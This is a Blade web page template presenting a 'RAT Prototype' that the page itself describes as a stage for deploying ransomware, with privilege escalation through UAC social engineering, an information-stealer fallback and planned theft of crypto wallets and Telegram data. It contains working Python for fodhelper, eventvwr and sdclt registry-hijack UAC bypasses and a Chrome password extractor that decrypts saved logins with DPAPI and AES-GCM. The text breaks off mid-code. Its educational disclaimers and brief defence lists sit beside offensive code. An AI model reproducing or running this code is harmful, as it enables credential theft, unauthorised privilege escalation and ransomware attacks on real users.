@extends('layouts.nexus')

@section('title', 'RAT Prototype Development - Nexus Project')

@push('styles')
<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
<style>
    .blur-sensitive {
        filter: blur(8px);
        transition: filter 0.3s ease;
        cursor: pointer;
        user-select: none;
    }
    
    .blur-sensitive:hover {
        filter: blur(4px);
    }
    
    .blur-sensitive.revealed {
        filter: none;
    }
    
    .warning-overlay {
        position: absolute;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(147, 51, 234, 0.1);
        border: 2px dashed #9333ea;
        display: flex;
        align-items: center;
        justify-content: center;
        font-weight: bold;
        color: #9333ea;
        backdrop-filter: blur(2px);
    }
    
    .educational-note {
        background: linear-gradient(135deg, #1e40af 0%, #7c3aed 100%);
        border-left: 4px solid #3b82f6;
    }
    
    .danger-note {
        background: linear-gradient(135deg, #7c2d12 0%, #9333ea 100%);
        border-left: 4px solid #a855f7;
    }
</style>
@endpush

@section('content')
<div class="max-w-7xl mx-auto">
    <!-- Hero Section -->
    <section class="pt-20 pb-16 bg-gradient-to-br from-purple-900 via-pink-900 to-indigo-900 rounded-2xl mb-12">
        <div class="px-8">
            <div class="text-center mb-16">
                <div class="inline-flex items-center px-4 py-2 bg-purple-500/20 rounded-full text-purple-300 text-sm font-medium mb-6">
                    <i class="fas fa-graduation-cap mr-2"></i>
                    Educational Development Only
                </div>
                <h1 class="text-5xl md:text-6xl font-bold mb-6 bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">
                    RAT Prototype
                </h1>
                <h2 class="text-3xl md:text-4xl font-semibold mb-6 text-white">
                    Remote Access Tool Development
                </h2>
                <p class="text-xl md:text-2xl text-gray-300 max-w-4xl mx-auto">
                    Educational development of Remote Access Tool prototype for understanding system vulnerabilities and implementing comprehensive security measures
                </p>
            </div>
        </div>
    </section>

    <!-- Warning Banner -->
    <section class="py-8 bg-purple-900/30 border-y border-purple-500/30 rounded-lg mb-12">
        <div class="px-8">
            <div class="danger-note rounded-lg p-6">
                <div class="flex items-center mb-4">
                    <i class="fas fa-exclamation-triangle text-yellow-400 text-2xl mr-4"></i>
                    <h3 class="text-xl font-bold text-white">Educational Purpose Disclaimer</h3>
                </div>
                <p class="text-gray-200 mb-3">
                    This RAT prototype is developed solely for educational cybersecurity research and defensive purposes. 
                    All implementations are controlled and sanitized for academic study.
                </p>
                <ul class="text-gray-200 space-y-1">
                    <li><i class="fas fa-check text-green-400 mr-2"></i>Controlled laboratory environment only</li>
                    <li><i class="fas fa-check text-green-400 mr-2"></i>No unauthorized access capabilities</li>
                    <li><i class="fas fa-check text-green-400 mr-2"></i>Focus on defense and detection methods</li>
                </ul>
            </div>
        </div>
    </section>    <!-- RAT Prototype Overview -->
    <section class="py-12 mb-12">
        <div class="px-8">
            <h2 class="text-4xl font-bold text-white mb-8 text-center">RAT Prototype Architecture</h2>
            <div class="max-w-4xl mx-auto mb-12">
                <div class="educational-note rounded-lg p-6">
                    <div class="flex items-center mb-4">
                        <i class="fas fa-info-circle text-blue-400 text-xl mr-3"></i>
                        <h3 class="text-lg font-bold text-white">Development Overview</h3>
                    </div>
                    <p class="text-gray-200">
                        This Remote Access Trojan (RAT) serves as a preparatory stage for deploying ransomware payloads and other detection/persistence scripts. 
                        The primary objective is acquiring elevated privileges through Windows UAC social engineering, providing full authority for subsequent operations.
                    </p>
                </div>
            </div>
        </div>

        <!-- Key Functionalities Grid -->
        <div class="grid lg:grid-cols-2 gap-8 mb-12">
            <!-- Privilege Escalation -->
            <div class="bg-gray-800/50 rounded-lg p-6 border border-red-500/30">
                <h3 class="text-2xl font-semibold text-red-400 mb-4">
                    <i class="fas fa-user-shield mr-3"></i>
                    Privilege Escalation
                </h3>
                <div class="space-y-3">
                    <div class="flex items-start">
                        <i class="fas fa-caret-right text-red-400 mr-2 mt-1"></i>
                        <p class="text-gray-300">Utilizes Windows scripting to trigger UAC prompts</p>
                    </div>
                    <div class="flex items-start">
                        <i class="fas fa-caret-right text-red-400 mr-2 mt-1"></i>
                        <p class="text-gray-300">Requests administrative privileges through social engineering</p>
                    </div>
                    <div class="flex items-start">
                        <i class="fas fa-caret-right text-red-400 mr-2 mt-1"></i>
                        <p class="text-gray-300">Enables full system access for subsequent payloads</p>
                    </div>
                </div>
            </div>

            <!-- Data Extraction -->
            <div class="bg-gray-800/50 rounded-lg p-6 border border-yellow-500/30">
                <h3 class="text-2xl font-semibold text-yellow-400 mb-4">
                    <i class="fas fa-database mr-3"></i>
                    Cookie & Credential Extraction
                </h3>
                <div class="space-y-3">
                    <div class="flex items-start">
                        <i class="fas fa-caret-right text-yellow-400 mr-2 mt-1"></i>
                        <p class="text-gray-300">Leverages win32crypt API for browser credentials</p>
                    </div>
                    <div class="flex items-start">
                        <i class="fas fa-caret-right text-yellow-400 mr-2 mt-1"></i>
                        <p class="text-gray-300">Uses sqlite3 for temporary database access</p>
                    </div>
                    <div class="flex items-start">
                        <i class="fas fa-caret-right text-yellow-400 mr-2 mt-1"></i>
                        <p class="text-gray-300">Targets browser profile folders and saved data</p>
                    </div>
                </div>
            </div>

            <!-- WebSocket Exploitation -->
            <div class="bg-gray-800/50 rounded-lg p-6 border border-blue-500/30">
                <h3 class="text-2xl font-semibold text-blue-400 mb-4">
                    <i class="fas fa-globe mr-3"></i>
                    WebSocket Exploitation
                </h3>
                <div class="space-y-3">
                    <div class="flex items-start">
                        <i class="fas fa-caret-right text-blue-400 mr-2 mt-1"></i>
                        <p class="text-gray-300">Targets Chromium-based browsers</p>
                    </div>
                    <div class="flex items-start">
                        <i class="fas fa-caret-right text-blue-400 mr-2 mt-1"></i>
                        <p class="text-gray-300">Exploits DevTools WebSocket connections</p>
                    </div>
                    <div class="flex items-start">
                        <i class="fas fa-caret-right text-blue-400 mr-2 mt-1"></i>
                        <p class="text-gray-300">Establishes persistent communication channels</p>
                    </div>
                </div>
            </div>

            <!-- Stealth Operations -->
            <div class="bg-gray-800/50 rounded-lg p-6 border border-purple-500/30">
                <h3 class="text-2xl font-semibold text-purple-400 mb-4">
                    <i class="fas fa-eye-slash mr-3"></i>
                    Stealth Execution
                </h3>
                <div class="space-y-3">
                    <div class="flex items-start">
                        <i class="fas fa-caret-right text-purple-400 mr-2 mt-1"></i>
                        <p class="text-gray-300">Terminates GUI browser processes</p>
                    </div>
                    <div class="flex items-start">
                        <i class="fas fa-caret-right text-purple-400 mr-2 mt-1"></i>
                        <p class="text-gray-300">Restarts browsers in headless CLI mode</p>
                    </div>
                    <div class="flex items-start">
                        <i class="fas fa-caret-right text-purple-400 mr-2 mt-1"></i>
                        <p class="text-gray-300">Executes background commands silently</p>
                    </div>
                </div>
            </div>
        </div>

        <!-- Advanced Features -->
        <div class="bg-gradient-to-r from-gray-800/30 to-gray-700/30 rounded-lg p-8 mb-12 border border-gray-600/30">
            <h3 class="text-3xl font-bold text-white mb-6 text-center">Advanced Capabilities</h3>
            <div class="grid md:grid-cols-3 gap-6">
                <!-- Cryptocurrency Theft -->
                <div class="text-center">
                    <div class="w-16 h-16 bg-gradient-to-br from-orange-500 to-yellow-500 rounded-full flex items-center justify-center mx-auto mb-4">
                        <i class="fab fa-bitcoin text-white text-2xl"></i>
                    </div>
                    <h4 class="text-lg font-semibold text-orange-400 mb-2">Cryptocurrency Theft</h4>
                    <p class="text-gray-300 text-sm">Extracts data from browser-based wallet extensions</p>
                    <div class="text-xs text-gray-500 mt-2">(Future Implementation)</div>
                </div>

                <!-- Telegram Data Collection -->
                <div class="text-center">
                    <div class="w-16 h-16 bg-gradient-to-br from-blue-500 to-cyan-500 rounded-full flex items-center justify-center mx-auto mb-4">
                        <i class="fab fa-telegram text-white text-2xl"></i>
                    </div>
                    <h4 class="text-lg font-semibold text-cyan-400 mb-2">Telegram Data Collection</h4>
                    <p class="text-gray-300 text-sm">Targets local Telegram Desktop data files</p>
                    <div class="text-xs text-gray-500 mt-2">(Future Implementation)</div>
                </div>

                <!-- Payload Deployment -->
                <div class="text-center">
                    <div class="w-16 h-16 bg-gradient-to-br from-red-500 to-pink-500 rounded-full flex items-center justify-center mx-auto mb-4">
                        <i class="fas fa-rocket text-white text-2xl"></i>
                    </div>
                    <h4 class="text-lg font-semibold text-pink-400 mb-2">Payload Deployment</h4>
                    <p class="text-gray-300 text-sm">Launches ransomware once privileges are obtained</p>
                    <div class="text-xs text-gray-500 mt-2">(Core Function)</div>
                </div>
            </div>
        </div>

        <!-- Persistence Mechanisms -->
        <div class="bg-gray-800/40 rounded-lg p-8 mb-12 border border-green-500/30">
            <h3 class="text-3xl font-bold text-green-400 mb-6">
                <i class="fas fa-cogs mr-3"></i>
                Persistence Mechanisms
            </h3>
            <div class="grid md:grid-cols-2 gap-8">
                <div>
                    <h4 class="text-xl font-semibold text-white mb-4">UAC Bypass Strategy</h4>
                    <div class="space-y-3">
                        <div class="flex items-start">
                            <i class="fas fa-check text-green-400 mr-2 mt-1"></i>
                            <p class="text-gray-300">Generates BAT files to bypass UAC prompts</p>
                        </div>
                        <div class="flex items-start">
                            <i class="fas fa-check text-green-400 mr-2 mt-1"></i>
                            <p class="text-gray-300">Adds folder exclusions in Windows Defender</p>
                        </div>
                        <div class="flex items-start">
                            <i class="fas fa-check text-green-400 mr-2 mt-1"></i>
                            <p class="text-gray-300">Maintains system-level privileges</p>
                        </div>
                    </div>
                </div>
                <div>
                    <h4 class="text-xl font-semibold text-white mb-4">Concealment Techniques</h4>
                    <div class="space-y-3">
                        <div class="flex items-start">
                            <i class="fas fa-check text-green-400 mr-2 mt-1"></i>
                            <p class="text-gray-300">Hides malware in legitimate driver folders</p>
                        </div>
                        <div class="flex items-start">
                            <i class="fas fa-check text-green-400 mr-2 mt-1"></i>
                            <p class="text-gray-300">Injects payload into trusted processes</p>
                        </div>
                        <div class="flex items-start">
                            <i class="fas fa-check text-green-400 mr-2 mt-1"></i>
                            <p class="text-gray-300">Maintains low detection signatures</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- Fail-Safe Behavior -->
        <div class="danger-note rounded-lg p-6">
            <div class="flex items-center mb-4">
                <i class="fas fa-shield text-yellow-400 text-2xl mr-4"></i>
                <h3 class="text-2xl font-bold text-white">Fail-Safe Behavior</h3>
            </div>
            <p class="text-gray-200 text-lg">
                If the user declines the UAC prompt, the RAT continues executing as an information stealer, 
                collecting credentials and sensitive data to maintain operational value even without elevated privileges.
            </p>
        </div>
                        <div class="flex items-center p-3 bg-pink-900/20 rounded">
                            <i class="fas fa-eye text-pink-400 mr-3"></i>
                            <div>
                                <div class="text-white font-medium">System Monitoring</div>
                                <div class="text-gray-400 text-sm">Process and file system observation</div>
                            </div>
                        </div>
                        <div class="flex items-center p-3 bg-indigo-900/20 rounded">
                            <i class="fas fa-download text-indigo-400 mr-3"></i>
                            <div>
                                <div class="text-white font-medium">File Management</div>
                                <div class="text-gray-400 text-sm">Secure file transfer and operations</div>
                            </div>
                        </div>
                    </div>
                </div>
                
                <div class="bg-gray-800/30 rounded-lg p-6">
                    <h3 class="text-xl font-semibold text-white mb-4">Security Features</h3>
                    <div class="space-y-2">
                        <div class="flex items-center text-gray-300">
                            <i class="fas fa-lock text-purple-400 mr-3"></i>
                            End-to-end encryption for all communications
                        </div>
                        <div class="flex items-center text-gray-300">
                            <i class="fas fa-user-secret text-pink-400 mr-3"></i>
                            Authentication and authorization protocols
                        </div>
                        <div class="flex items-center text-gray-300">
                            <i class="fas fa-ghost text-indigo-400 mr-3"></i>
                            Stealth operation techniques
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Code Development Section -->
    <section class="py-12 bg-gray-800/30 rounded-2xl mb-12">
        <div class="px-8">
            <div class="text-center mb-16">
                <h2 class="text-4xl font-bold text-white mb-6">Development Analysis</h2>
                <p class="text-xl text-gray-300 max-w-3xl mx-auto">
                    Educational code structure for understanding RAT architecture and developing countermeasures
                </p>
            </div>
            
            <!-- RAT Architecture -->
            <div class="mb-12">
                <div class="educational-note rounded-lg p-6 mb-6">
                    <div class="flex items-center mb-3">
                        <i class="fas fa-graduation-cap text-blue-300 text-xl mr-3"></i>
                        <h3 class="text-lg font-bold text-white">Educational Code Framework</h3>
                    </div>
                    <p class="text-blue-100">
                        This framework demonstrates RAT architecture for educational understanding. 
                        Sensitive implementation details are redacted for safety.
                    </p>
                </div>
                
                <div class="code-container bg-gray-900 rounded-lg overflow-hidden border border-gray-700 relative">
                    <div class="bg-gray-800 px-6 py-3 border-b border-gray-700">
                        <div class="flex items-center justify-between">
                            <h4 class="text-white font-semibold">RAT Client Framework</h4>
                            <div class="flex space-x-2">
                                <button onclick="toggleBlur('rat-code')" class="px-3 py-1 bg-purple-600 hover:bg-purple-700 text-white text-xs rounded">
                                    Reveal for Study
                                </button>
                                <span class="px-3 py-1 bg-orange-600 text-white text-xs rounded">Educational</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="p-6">
                        <pre class="blur-sensitive" id="rat-code"><code class="language-python"># === Educational RAT Framework ===
# WARNING: For educational cybersecurity research only
import socket
import threading
import json
import base64
from cryptography.fernet import Fernet

class EducationalRAT:
    """
    Educational Remote Access Tool for cybersecurity research
    THIS IS FOR DEFENSIVE ANALYSIS ONLY
    """
    
    def __init__(self, server_host="[REDACTED]", server_port="[REDACTED]"):
        self.host = server_host
        self.port = server_port
        self.encryption_key = b'[EDUCATIONAL_KEY_REDACTED]'
        self.cipher = Fernet(self.encryption_key)
        self.connection = None
        self.running = False
    
    def establish_connection(self):
        """
        Educational method to understand connection establishment
        IMPLEMENTATION DETAILS REDACTED FOR SAFETY
        """
        try:
            # [CONNECTION_LOGIC_BLURRED]
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Real implementation would include:
            # - SSL/TLS encryption
            # - Authentication protocols
            # - Connection persistence
            print("Educational: Connection analysis completed")
        except Exception as e:
            print(f"Connection study error: {e}")
    
    def send_encrypted_data(self, data):
        """
        Educational encryption demonstration
        FOR UNDERSTANDING SECURE COMMUNICATION ONLY
        """
        try:
            # [ENCRYPTION_PROCESS_REDACTED]
            encrypted_data = self.cipher.encrypt(data.encode())
            encoded_data = base64.b64encode(encrypted_data)
            print("Educational: Data encryption process analyzed")
            return encoded_data
        except Exception as e:
            print(f"Encryption analysis error: {e}")
    
    def receive_commands(self):
        """
        Educational command reception framework
        ACTUAL IMPLEMENTATION BLOCKED FOR SAFETY
        """
        while self.running:
            try:
                # [COMMAND_PROCESSING_BLURRED]
                encrypted_command = self.connection.recv(1024)
                decrypted_command = self.cipher.decrypt(encrypted_command)
                command = json.loads(decrypted_command.decode())
                
                # Educational command analysis
                self.analyze_command_structure(command)
                
            except Exception as e:
                print(f"Command analysis error: {e}")
                break
    
    def analyze_command_structure(self, command):
        """
        Educational analysis of command structures
        FOR DEFENSIVE UNDERSTANDING ONLY
        """
        command_types = {
            'system_info': 'Gather system information',
            'file_operations': 'File management commands',
            'process_control': 'Process monitoring and control',
            'network_scan': 'Network reconnaissance'
        }
        
        print(f"Educational Analysis: Command type {command.get('type', 'unknown')}")
        # [ACTUAL_EXECUTION_BLOCKED_FOR_SAFETY]
    
    def educational_stealth_techniques(self):
        """
        Study of stealth techniques for defensive purposes
        """
        stealth_methods = [
            "Process name obfuscation analysis",
            "Registry persistence study",
            "Network traffic camouflage research",
            "Anti-debugging technique analysis"
        ]
        
        for method in stealth_methods:
            print(f"Analyzing: {method}")
            # [IMPLEMENTATION_REDACTED_FOR_EDUCATIONAL_SAFETY]

# Educational usage for cybersecurity research
if __name__ == "__main__":
    print("=== Educational RAT Analysis Framework ===")
    print("For cybersecurity research and defense development only")
    
    # Educational instantiation (non-functional)
    educational_rat = EducationalRAT()
    
    # Analysis of security implications
    security_implications = {
        'detection_vectors': ['Network traffic analysis', 'Process monitoring', 'Registry watching'],
        'defense_strategies': ['Endpoint protection', 'Network segmentation', 'Behavioral analysis'],
        'forensic_artifacts': ['Log entries', 'Network connections', 'File modifications']
    }
    
    print("Security Analysis Complete - For Educational Purposes Only")</code></pre>
                        <div class="warning-overlay" id="rat-warning">
                            <div class="text-center">
                                <i class="fas fa-eye-slash text-2xl mb-2"></i>
                                <div>Framework Blurred for Safety</div>
                                <div class="text-sm">Educational Research Only</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Defense Analysis -->
            <div class="grid lg:grid-cols-2 gap-8">
                <div class="bg-gray-900 rounded-lg p-6 border border-green-500/30">
                    <h3 class="text-xl font-bold text-green-400 mb-4">
                        <i class="fas fa-shield-alt mr-2"></i>
                        Detection Methods
                    </h3>
                    <div class="space-y-3">
                        <div class="bg-gray-800/50 p-4 rounded">
                            <h4 class="font-semibold text-white mb-2">Network Monitoring</h4>
                            <p class="text-gray-300 text-sm">Unusual outbound connections and data transmission patterns.</p>
                        </div>
                        <div class="bg-gray-800/50 p-4 rounded">
                            <h4 class="font-semibold text-white mb-2">Process Analysis</h4>
                            <p class="text-gray-300 text-sm">Suspicious process behavior and system call patterns.</p>
                        </div>
                        <div class="bg-gray-800/50 p-4 rounded">
                            <h4 class="font-semibold text-white mb-2">Behavioral Signatures</h4>
                            <p class="text-gray-300 text-sm">Characteristic RAT behavior patterns for identification.</p>
                        </div>
                    </div>
                </div>
                
                <div class="bg-gray-900 rounded-lg p-6 border border-blue-500/30">
                    <h3 class="text-xl font-bold text-blue-400 mb-4">
                        <i class="fas fa-lock mr-2"></i>
                        Prevention Strategies
                    </h3>
                    <div class="space-y-3">
                        <div class="bg-gray-800/50 p-4 rounded">
                            <h4 class="font-semibold text-white mb-2">Application Whitelisting</h4>
                            <p class="text-gray-300 text-sm">Prevent unauthorized application execution.</p>
                        </div>
                        <div class="bg-gray-800/50 p-4 rounded">
                            <h4 class="font-semibold text-white mb-2">Network Segmentation</h4>
                            <p class="text-gray-300 text-sm">Limit lateral movement and command & control access.</p>
                        </div>
                        <div class="bg-gray-800/50 p-4 rounded">
                            <h4 class="font-semibold text-white mb-2">Endpoint Protection</h4>
                            <p class="text-gray-300 text-sm">Advanced threat detection and response capabilities.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Security Analysis & Countermeasures -->
    <section class="py-12 bg-gradient-to-r from-gray-800/40 to-gray-700/40 rounded-2xl mb-12">
        <div class="px-8">
            <h2 class="text-4xl font-bold text-white mb-8 text-center">Security Analysis & Countermeasures</h2>
            
            <!-- Detection Methods -->
            <div class="grid lg:grid-cols-2 gap-8 mb-12">
                <div class="bg-gray-800/50 rounded-lg p-6 border border-blue-500/30">
                    <h3 class="text-2xl font-semibold text-blue-400 mb-4">
                        <i class="fas fa-search mr-3"></i>
                        Detection Strategies
                    </h3>
                    <div class="space-y-4">
                        <div class="flex items-start">
                            <i class="fas fa-shield-alt text-blue-400 mr-3 mt-1"></i>
                            <div>
                                <h4 class="text-white font-semibold mb-1">Behavioral Analysis</h4>
                                <p class="text-gray-300 text-sm">Monitor for UAC bypass attempts and unusual privilege escalation patterns</p>
                            </div>
                        </div>
                        <div class="flex items-start">
                            <i class="fas fa-eye text-blue-400 mr-3 mt-1"></i>
                            <div>
                                <h4 class="text-white font-semibold mb-1">Process Monitoring</h4>
                                <p class="text-gray-300 text-sm">Track headless browser launches and process injection activities</p>
                            </div>
                        </div>
                        <div class="flex items-start">
                            <i class="fas fa-network-wired text-blue-400 mr-3 mt-1"></i>
                            <div>
                                <h4 class="text-white font-semibold mb-1">Network Traffic Analysis</h4>
                                <p class="text-gray-300 text-sm">Detect suspicious WebSocket connections and data exfiltration</p>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="bg-gray-800/50 rounded-lg p-6 border border-green-500/30">
                    <h3 class="text-2xl font-semibold text-green-400 mb-4">
                        <i class="fas fa-lock mr-3"></i>
                        Prevention Measures
                    </h3>
                    <div class="space-y-4">
                        <div class="flex items-start">
                            <i class="fas fa-user-shield text-green-400 mr-3 mt-1"></i>
                            <div>
                                <h4 class="text-white font-semibold mb-1">UAC Hardening</h4>
                                <p class="text-gray-300 text-sm">Configure strict UAC policies and user privilege restrictions</p>
                            </div>
                        </div>
                        <div class="flex items-start">
                            <i class="fas fa-database text-green-400 mr-3 mt-1"></i>
                            <div>
                                <h4 class="text-white font-semibold mb-1">Browser Security</h4>
                                <p class="text-gray-300 text-sm">Implement credential encryption and secure profile storage</p>
                            </div>
                        </div>
                        <div class="flex items-start">
                            <i class="fas fa-cog text-green-400 mr-3 mt-1"></i>
                            <div>
                                <h4 class="text-white font-semibold mb-1">System Hardening</h4>
                                <p class="text-gray-300 text-sm">Disable unnecessary DevTools protocols and strengthen process isolation</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Real Implementation Techniques -->
    <section class="py-12 bg-gradient-to-r from-gray-900/50 to-purple-900/30 rounded-2xl mb-12">
        <div class="px-8">
            <h2 class="text-4xl font-bold text-white mb-8 text-center">Real Implementation Techniques</h2>
            
            <!-- UAC Bypass Implementation -->
            <div class="mb-12">
                <div class="educational-note rounded-lg p-6 mb-6">
                    <div class="flex items-center mb-3">
                        <i class="fas fa-shield-alt text-red-400 text-xl mr-3"></i>
                        <h3 class="text-lg font-bold text-white">UAC Bypass & Privilege Escalation</h3>
                    </div>
                    <p class="text-blue-100">
                        Real techniques for bypassing Windows User Account Control for educational defense development.
                    </p>
                </div>
                
                <div class="code-container bg-gray-900 rounded-lg overflow-hidden border border-gray-700 relative">
                    <div class="bg-gray-800 px-6 py-3 border-b border-gray-700">
                        <div class="flex items-center justify-between">
                            <h4 class="text-white font-semibold">UAC Bypass Implementation</h4>
                            <div class="flex space-x-2">
                                <button onclick="toggleBlur('uac-code')" class="px-3 py-1 bg-red-600 hover:bg-red-700 text-white text-xs rounded">
                                    Reveal Technique
                                </button>
                                <span class="px-3 py-1 bg-orange-600 text-white text-xs rounded">Defense Research</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="p-6">
                        <pre class="blur-sensitive" id="uac-code"><code class="language-python"># UAC Bypass Implementation - Educational Analysis
import os
import subprocess
import winreg
import ctypes
from ctypes import wintypes

class UACBypass:
    """
    Educational UAC bypass techniques for defense research
    Based on analysis of real malware implementations
    """
    
    def __init__(self):
        self.admin_check = self._is_admin()
        self.bypass_methods = [
            "fodhelper_bypass",
            "eventvwr_bypass", 
            "computerdefaults_bypass",
            "sdclt_bypass"
        ]
    
    def _is_admin(self):
        """Check if running with admin privileges"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    
    def fodhelper_bypass(self):
        """
        FodHelper.exe UAC bypass technique
        Educational implementation for defense analysis
        """
        try:
            # Create registry key for delegation
            key_path = r"Software\Classes\ms-settings\Shell\Open\command"
            
            # Open registry key with write access
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            
            # Set default value to our payload
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, self.payload_path)
            
            # Set DelegateExecute for bypass
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            
            winreg.CloseKey(key)
            
            # Execute fodhelper.exe to trigger bypass
            subprocess.Popen("C:\\Windows\\System32\\fodhelper.exe", shell=True)
            
            print("[!] FodHelper UAC bypass executed")
            
        except Exception as e:
            print(f"[!] FodHelper bypass failed: {e}")
    
    def eventvwr_bypass(self):
        """
        Event Viewer UAC bypass technique
        """
        try:
            key_path = r"Software\Classes\mscfile\shell\open\command"
            
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, self.payload_path)
            winreg.CloseKey(key)
            
            # Execute eventvwr.exe
            subprocess.Popen("C:\\Windows\\System32\\eventvwr.exe", shell=True)
            
            print("[!] EventVwr UAC bypass executed")
            
        except Exception as e:
            print(f"[!] EventVwr bypass failed: {e}")
    
    def sdclt_bypass(self):
        """
        SDCLT.exe UAC bypass technique
        """
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"
            
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, self.payload_path)
            winreg.CloseKey(key)
            
            # Execute sdclt.exe
            subprocess.Popen("C:\\Windows\\System32\\sdclt.exe", shell=True)
            
            print("[!] SDCLT UAC bypass executed")
            
        except Exception as e:
            print(f"[!] SDCLT bypass failed: {e}")

# Educational Defense Analysis
def analyze_uac_bypasses():
    """
    Educational analysis of UAC bypass techniques
    FOR DEFENSIVE PURPOSES ONLY
    """
    bypass_techniques = {
        'fodhelper': {
            'registry_path': r'HKCU\Software\Classes\ms-settings\Shell\Open\command',
            'executable': 'fodhelper.exe',
            'detection': 'Monitor registry writes to ms-settings class'
        },
        'eventvwr': {
            'registry_path': r'HKCU\Software\Classes\mscfile\shell\open\command',
            'executable': 'eventvwr.exe', 
            'detection': 'Monitor mscfile class modifications'
        },
        'computerdefaults': {
            'registry_path': r'HKCU\Software\Classes\ms-settings\Shell\Open\command',
            'executable': 'computerdefaults.exe',
            'detection': 'Process monitoring and registry surveillance'
        }
    }
    
    print("=== UAC Bypass Analysis for Defense ===")
    for technique, details in bypass_techniques.items():
        print(f"Technique: {technique}")
        print(f"  Registry: {details['registry_path']}")
        print(f"  Executable: {details['executable']}")
        print(f"  Detection: {details['detection']}")
        print()
    
    return bypass_techniques</code></pre>
                        <div class="warning-overlay" id="uac-warning">
                            <div class="text-center">
                                <i class="fas fa-shield-alt text-2xl mb-2"></i>
                                <div>UAC Bypass Techniques</div>
                                <div class="text-sm">Defense Research Only</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- Browser Credential Extraction -->
            <div class="mb-12">
                <div class="educational-note rounded-lg p-6 mb-6">
                    <div class="flex items-center mb-3">
                        <i class="fas fa-database text-yellow-400 text-xl mr-3"></i>
                        <h3 class="text-lg font-bold text-white">Browser Credential Extraction</h3>
                    </div>
                    <p class="text-blue-100">
                        Analysis of browser credential harvesting techniques using win32crypt and SQLite.
                    </p>
                </div>
                
                <div class="code-container bg-gray-900 rounded-lg overflow-hidden border border-gray-700 relative">
                    <div class="bg-gray-800 px-6 py-3 border-b border-gray-700">
                        <div class="flex items-center justify-between">
                            <h4 class="text-white font-semibold">Credential Extraction Framework</h4>
                            <div class="flex space-x-2">
                                <button onclick="toggleBlur('cred-code')" class="px-3 py-1 bg-yellow-600 hover:bg-yellow-700 text-white text-xs rounded">
                                    Reveal Methods
                                </button>
                                <span class="px-3 py-1 bg-orange-600 text-white text-xs rounded">Browser Security</span>
                            </div>
                        </div>
                    </div>
                    
                    <div class="p-6">
                        <pre class="blur-sensitive" id="cred-code"><code class="language-python"># Browser Credential Extraction - Educational Analysis
import os
import sqlite3
import json
import base64
import win32crypt
from Crypto.Cipher import AES
import shutil
import tempfile

class BrowserCredentialExtractor:
    """
    Educational browser credential analysis for security research
    Understanding how malware extracts browser credentials
    """
    
    def __init__(self):
        self.browsers = {
            'chrome': {
                'path': os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data',
                'login_db': 'Login Data',
                'master_key': 'Local State'
            },
            'edge': {
                'path': os.path.expanduser('~') + r'\AppData\Local\Microsoft\Edge\User Data',
                'login_db': 'Login Data', 
                'master_key': 'Local State'
            },
            'firefox': {
                'path': os.path.expanduser('~') + r'\AppData\Roaming\Mozilla\Firefox\Profiles',
                'login_db': 'logins.json',
                'key_db': 'key4.db'
            }
        }
    
    def get_master_key(self, browser_path):
        """
        Extract browser master key for credential decryption
        Educational analysis of DPAPI protection
        """
        try:
            local_state_path = os.path.join(browser_path, 'Local State')
            
            if not os.path.exists(local_state_path):
                return None
                
            with open(local_state_path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
            
            # Extract encrypted key
            encrypted_key = base64.b64decode(
                local_state['os_crypt']['encrypted_key']
            )
            
            # Remove DPAPI prefix
            encrypted_key = encrypted_key[5:]
            
            # Decrypt using DPAPI
            master_key = win32crypt.CryptUnprotectData(
                encrypted_key, None, None, None, 0
            )[1]
            
            return master_key
            
        except Exception as e:
            print(f"[!] Master key extraction failed: {e}")
            return None
    
    def decrypt_password(self, password, master_key):
        """
        Decrypt browser password using AES-256-GCM
        Educational implementation for security analysis
        """
        try:
            # Extract initialization vector
            iv = password[3:15]
            password = password[15:]
            
            # Create AES cipher
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            
            # Decrypt password
            decrypted_password = cipher.decrypt(password)[:-16].decode()
            
            return decrypted_password
            
        except Exception as e:
            print(f"[!] Password decryption failed: {e}")
            return None
    
    def extract_chrome_credentials(self):
        """
        Extract Chrome credentials for security analysis
        """
        try:
            browser_path = self.browsers['chrome']['path']
            
            # Get master key
            master_key = self.get_master_key(browser_path)
            if not master_key:
                return []
            
            credentials = []
            
            # Process all Chrome profiles
            for profile in os.listdir(browser_path):
                if profile.startswith('Default') or profile.startswith('Profile'):
                    profile_path = os.path.join(browser_path, profile)
                    login_db_path = os.path.join(profile_path, 'Login Data')
                    
                    if not os.path.exists(login_db_path):
                        continue
                    
                    # Copy database to temporary location
                    temp_db_path = os.path.join(tempfile.gettempdir(), 'LoginData.db')
                    shutil.copy2(login_db_path, temp_db_path)
                    
                    # Connect to database
                    conn = sqlite3.connect(temp_db_path)
                    cursor = conn.cursor()
                    
                    # Query credentials
                    cursor.execute('''
                        SELECT origin_url, action_url, username_value, password_value 
                        FROM logins
                    ''')
                    
                    for row in cursor.fetchall():
                        url, action_url, username, encrypted_password = row
                        
                        if encrypted_password:
                            # Decrypt password
                            password = self.decrypt_password(encrypted_password, master_key)
                            
                            if password:
                                credentials.append({
                                    'url': url,
                                    'username': username,
                                    'password': password,
